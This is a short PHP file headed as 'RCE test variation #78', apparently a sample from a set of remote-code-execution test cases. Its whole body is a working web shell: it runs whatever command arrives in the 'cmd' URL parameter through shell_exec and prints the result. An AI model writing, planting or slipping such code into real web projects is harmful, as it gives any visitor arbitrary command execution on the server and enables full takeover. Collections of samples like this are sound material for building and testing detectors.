<?php
// RCE test variation #78
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>